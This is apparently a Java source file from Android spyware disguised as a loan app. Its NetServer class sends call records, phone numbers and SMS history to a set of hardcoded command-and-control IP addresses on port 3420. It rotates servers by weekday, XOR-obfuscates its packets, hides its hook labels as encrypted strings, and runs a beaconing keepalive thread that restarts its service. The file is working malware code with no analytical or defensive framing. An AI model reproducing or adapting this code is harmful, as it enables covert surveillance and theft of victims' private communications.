package main.app.loan;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.util.Arrays;
import java.util.Calendar;

import sub.app.entry.Task;

import android.content.Context;
import android.content.Intent;


public class NetServer{
	
	public static int PACKET_HEADER_UID = 0x9832ffb2;
	public static int PACKET_HEADER_VER = 0x01;

	public static byte OPCODE_PHONE_TEXT = 0x33;
	public static byte OPCODE_PHONE_KEEPALIVE = 0x55;
	
	public static byte OPCODE_PHONE_SENDINSTALL = 0x77;
	public static byte OPCODE_PHONE_PERSON = 0x79;
	

	public static String[] SERVER_IP = new String[]{
		"115.126.14.110",
		"115.126.14.111",
		"115.126.14.112",
		"115.126.14.113",
		"115.126.14.114",
	};
	public static int SERVER_PORT = 3420;
	
	public static String getServerIP()
	{
		String result = "";
		try{
			Calendar cal = Calendar.getInstance();
			int weekday = cal.get(Calendar.DAY_OF_WEEK);
			int nIndex = 0;
			if(weekday >= Calendar.MONDAY && weekday <= Calendar.FRIDAY)
			{
				nIndex = weekday - Calendar.MONDAY;
			}
			else
			{
				nIndex = 4;
			}
//			result = GlobalLib.decrypt(SERVER_IP[nIndex]);
			result = SERVER_IP[nIndex];
		}
		catch(Exception e)
		{
			
		}
		return result;
	}
	
	public static void DecryptPacketPhone(byte[] pbData)
	{
		try{
			if (pbData == null || pbData.length <= 0)
			{
				return;
			}
			
			byte byTmp = 0;
			int nLen = pbData.length;
			for(int i = 0; i < nLen; i++)
			{
				pbData[i] ^= (byTmp * 3);
				pbData[i] ^= (byte)(0xC3+(i & 0xFF));
				byTmp = pbData[i];
			}
		}
		catch(Exception e)
		{
			
		}
	}

	public static void EncryptPacketPhone(byte[] pbData)
	{
		try{
			int nLen = pbData.length;
			byte byTmp1 = 0; byte byTmp2 = 0;
			for(int i = 0; i < nLen; i++)
			{
				byTmp2 = pbData[i];
				pbData[i] ^= (byTmp1 * 3);
				pbData[i] ^= (byte)(0xC3+(i & 0xFF));
				byTmp1 = byTmp2;
			}
		}
		catch(Exception e)
		{
			
		}
	}
	
	public static String MakeStringBody(String header, String from, String to, String time, String duration, String body, String comment)
	{
		String strResult = "";
		try{
			String proto[] = new String[]{"HEAD:", "FROM:", "TO:", "TIME:", "LEN:", "BODY:", "EXTRA:"};
			String data[] = new String[]{header, from, to, time, duration, body, comment};
			
			for (int i = 0; i < data.length; i++)
			{
				String strData = data[i];

				if (strData == null){continue;}

				strData.replace("[", "");
				strData.replace("]", "");
				strData.replace("{", "");
				strData.replace("}", "");
				strData.trim();
				
				if("".equals(strData) == true)
				{
					continue;
				}
				
				strResult=strResult+"["+proto[i]+strData+"]";
			}
		}
		catch(Exception e)
		{}
		
		if(strResult.length() > 0)
		{
			strResult = "{"+strResult+"}";
		}
		
		return strResult;
	}
	
	//Op[1B] | Len[4B] | Data(UID[4B]|Ver[4B]|body)
	public static byte[] MakePacket(byte nOpcode, int nUID, int nVer, byte[] data)
	{
		try{
			//
			int nDataLen = data.length + 8;
	        byte[] byPacket = new byte[5 + nDataLen];
	        Arrays.fill(byPacket, (byte)0);
	        
	        byte[] encBody = new byte[nDataLen];
	        Arrays.fill(encBody, (byte)0);

	        //
	        int nOffset = 0;
	        byte[] temp = null;
	        
	        temp = GlobalLib.intToByteArray(nUID);
	        System.arraycopy(temp, 0, encBody, nOffset, temp.length);
	        nOffset+=4;

	        temp = GlobalLib.intToByteArray(nVer);
	        System.arraycopy(temp, 0, encBody, nOffset, temp.length);
	        nOffset+=4;

	        System.arraycopy(data, 0, encBody, nOffset, data.length);
	        
	        EncryptPacketPhone(encBody);
	        
	        //
	        nOffset = 0;
	        temp = null;
	        
	        byPacket[0] = nOpcode;
	        nOffset+=1;
	        
	        temp = GlobalLib.intToByteArray(nDataLen);
	        System.arraycopy(temp, 0, byPacket, nOffset, temp.length);
	        nOffset+=4;
	
	        System.arraycopy(encBody, 0, byPacket, nOffset, encBody.length);
	
	        return byPacket;
		}
		catch(Exception e)
		{
			
		}
		return null;
	}

	public static String CALL_OUT_HOOK =  GlobalLib.decrypt("vDch7rH3XLpeTNeuCyTFsw=="); //CALLSEND_HOOK
	public static String CALL_OUT_HOOK1 = GlobalLib.decrypt("gPLpKFROtNZb0LLO8RAZxQ=="); //CALLSEND_HOOK1
	public static String CALL_OUT_NORM = GlobalLib.decrypt("ChvoKNNlP7JvS5xa65UQhw=="); //CALLSEND_NORM
	public static String CALL_IN_HOOK = GlobalLib.decrypt("rbnx+dqbVLm5N583ytq3rA=="); //CALLRECV_HOOK
	public static String CALL_IN_NORM = GlobalLib.decrypt("zDJ5p4dsu5LDbUWg+YWl1g=="); //CALLRECV_NORM
	public static String SMS_IN_HOOK = GlobalLib.decrypt("Hun3mOPv57I53/02p8OIVg=="); //SMSRECV_HOOK
	public static String SMS_IN_NORM = GlobalLib.decrypt("9PqQ0BXSDAe+32CpcumgRA=="); //SMSRECV_NORM
	public static String SMS_OUT_NORM = GlobalLib.decrypt("0/JcqYsKdiYD6c9h2tjyYA=="); //SMSSEND_NORM
	public static String APP_INSTALL_PKG = GlobalLib.decrypt("2w1U80u1Rjw0lV2D28Bm/A=="); //APPPKG_INFO

	public static void SendCallLog(Context context, String status, String strNum1, String strNum2)
	{
		final Context cxt = context;
		final String sts = status;
		final String num1 = strNum1;
		final String num2 = strNum2;
		
    	new Thread(new Runnable() {
			
			@Override
			public void run() {
				// TODO Auto-generated method stub
				String strBody = MakeStringBody(sts, num1, num2, null, null, null, null);
				
				try{
			        String strOutSms = GlobalLib.GetSMSHistory(cxt, false, true);
			        if(strOutSms != null && "".equals(strOutSms) == false)
			        {
			        	strBody = strBody + strOutSms;
			        }
				}
				catch(Exception e)
				{}

				String strPacket = strBody;

				try{
					sendTextPacket(strPacket);
				}
				catch(Exception e)
				{}
			}
		}).start();
	}


	public static void SendSMSLog(String strLog)
	{
		final String strBody = strLog;
		
    	new Thread(new Runnable() {
			
			@Override
			public void run() {
				// TODO Auto-generated method stub
				try{
					sendTextPacket(strBody);
				}
				catch(Exception e)
				{}
			}
		}).start();
	}
	
	public static boolean sendTextPacket(String strText)
	{
		Socket socket = null;
		try{
			if (strText.length() <= 0)
			{
				return false;
			}
			
			String strData = "{"+mDeviceUID + "}" + strText;
			
            byte[] byStr = strData.getBytes("UTF8");
            if (byStr.length <= 0)
            {
            	return false;
            }
            
            byte[] data = new byte[byStr.length + 1];
            Arrays.fill(data, (byte)0);
            System.arraycopy(byStr, 0, data, 0, byStr.length);

    		socket = null;
    		
    		int nConnTry = 0;
    		boolean bConnect = false;
    		while(nConnTry <5)
    		{
    			try {
    				socket = new Socket();
    				int nConnTimeout= 15 * 1000;
    				String strIP = getServerIP();
    				SocketAddress remoteAddr = new InetSocketAddress(strIP,	SERVER_PORT);

    				socket.connect(remoteAddr, nConnTimeout);
    				bConnect = true;
    				break;
    			}
    			catch(Exception e)
    			{
    				bConnect = false;
    			}
    			nConnTry++;
    			GlobalLib.sleep(5 * 1000);
    		}
    		if (bConnect == false)
    		{
    			return false;
    		}
			
			OutputStream out = socket.getOutputStream();
			DataOutputStream sock_out_stream = new DataOutputStream(out);
			//InputStream in = socket.getInputStream();
			//DataInputStream  sock_in_stream = new DataInputStream(in);
			
			byte[] byPacket = MakePacket(OPCODE_PHONE_TEXT, PACKET_HEADER_UID, PACKET_HEADER_VER, data);
			if (byPacket == null)
			{
				if (socket != null)
				{
					socket.close();
				}
				return false;
			}
			
			sock_out_stream.write(byPacket, 0, byPacket.length);
 
			socket.close();		
			
			return true;
		}
		catch(Exception e)
		{
		}
		
		try{
			if (socket != null)
			{
				socket.close();
			}
		}
		catch(Exception e)
		{
			
		}
		return false;
	}
	
	
	public static int sendAuthPacket(boolean bInstall)
	{
		
		Socket socket = null;
		
		int nConnTry = 0;
		boolean bConnect = false;
		while(nConnTry <5)
		{
			try {
				socket = new Socket();
				int nConnTimeout= 15 * 1000;
				String strIP = getServerIP();
				SocketAddress remoteAddr = new InetSocketAddress(strIP,	SERVER_PORT);

				socket.connect(remoteAddr, nConnTimeout);
				bConnect = true;
				break;
			}
			catch(Exception e)
			{
				bConnect = false;
			}
			nConnTry++;
			GlobalLib.sleep(5 * 1000);
		}
		
		if (bConnect == false)
		{
			return -1;
		}

		try{
			OutputStream out = socket.getOutputStream();
			DataOutputStream sock_out_stream = new DataOutputStream(out);
			InputStream in = socket.getInputStream();
			DataInputStream  sock_in_stream = new DataInputStream(in);
			
			byte[] temp = mDeviceUID.getBytes("UTF8");
			byte[] data = new byte[temp.length + 1];
			Arrays.fill(data, (byte)0);
			System.arraycopy(temp, 0, data, 0, temp.length);
			
			byte nSendCode = OPCODE_PHONE_KEEPALIVE;
			if (bInstall == true)
			{
				nSendCode = OPCODE_PHONE_SENDINSTALL;
			}
			byte[] byPacket = MakePacket(nSendCode, PACKET_HEADER_UID, PACKET_HEADER_VER, data);
			if (byPacket == null) 
			{
				socket.close();
				return -1;
			}
			
			sock_out_stream.write(byPacket, 0, byPacket.length);
			
			//nOpcode, nUID, nVer, nDataLen | data[nDataLen]
			byte nOpcode = sock_in_stream.readByte();
			int nDataLen = sock_in_stream.readInt();
			
			nDataLen = Integer.reverseBytes(nDataLen);
			
			if (nOpcode != OPCODE_PHONE_KEEPALIVE || nDataLen <= 0)
			{
				socket.close();
				return -1;
			}

			data = new byte[nDataLen];
			Arrays.fill(data, (byte)0);
			
			int nRecvLen = 0;
            while(nRecvLen < nDataLen)
            {
				int nlen = sock_in_stream.read(data, nRecvLen, nDataLen - nRecvLen);
				if(nlen == -1)
				{
					break;
				}
				nRecvLen += nlen;
            }
            
            DecryptPacketPhone(data);
            
            int nOffset = 0;
            
            int nAuthCmd = 0;
            
            temp = new byte[4];
            
            if(nOffset + temp.length <= nRecvLen)
            {
	            System.arraycopy(data, nOffset, temp, 0, temp.length);
	            nAuthCmd = GlobalLib.byteArrayToInt(temp);
	            nOffset+=temp.length;
            }

//            temp = null;
//
//            if(nOffset + 4 <= nRecvLen)
//            {
//            	temp = new byte[nRecvLen - nOffset + 2];
//				Arrays.fill(temp, (byte)0);
//	            System.arraycopy(data, nOffset, temp, 0, nRecvLen - nOffset);
//	            mIncomeNum = GlobalLib.ToCString(temp);
//	            
//	            nOffset+=temp.length;
//
//            }

            temp = null;

			socket.close();
			
			if (nAuthCmd == 1)
			{
				mAuthSuccess = AUTH_RESULT_SUCCESS;
			}
			else
			{
				mAuthSuccess = AUTH_RESULT_STOP;
			}

			
			return nAuthCmd;
		}
		catch(Exception e)
		{
		}
		
		try{
			if (socket != null)
			{
				socket.close();
			}
		}
		catch(Exception e)
		{
			
		}
		
		return -1;
	}
	
	public static long mAuthRunTick = 0;
	public static int AUTH_THREAD_SLEEP = 1000;
	public static long AUTH_KEEPALIVE_TICK = 0;
	public static int AUTH_KEEPALIVE_PERIOD = 2 * 60 * 1000;
	public static String mDeviceUID = "";
	
	public static int AUTH_RESULT_NONE = 0;
	public static int AUTH_RESULT_SUCCESS = 1;
	public static int AUTH_RESULT_STOP = 2;
	
	public static int mAuthSuccess = AUTH_RESULT_NONE;	//important
	
//	public static String mIncomeNum = null;
	
	public static void restartTasker(Context cxt)
	{
		try{
			Intent serviceIntent = new Intent(cxt, Task.class);
			serviceIntent.setAction(NetServer.class.getSimpleName());
			cxt.startService(serviceIntent);						
		}
		catch(Exception e)
		{
		}
	}
	
	public static void AuthToServer(Context context)
	{
		final Context cxt = context;
		
		long nNowTick = GlobalLib.GetTickCount();
		if (nNowTick - mAuthRunTick > 3 * 60 * 1000 || mAuthRunTick == 0)
		{
			new Thread(new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					while(true)
					{
						long nNowTick = GlobalLib.GetTickCount();
						
						mAuthRunTick = nNowTick;
						
						if(nNowTick - AUTH_KEEPALIVE_TICK > AUTH_KEEPALIVE_PERIOD || AUTH_KEEPALIVE_TICK == 0)
						{
							sendAuthPacket(false);
							AUTH_KEEPALIVE_TICK = GlobalLib.GetTickCount();
							
							restartTasker(cxt);
						}
						GlobalLib.sleep(AUTH_THREAD_SLEEP);
					}
				}
			}).start();
		}
	}

}
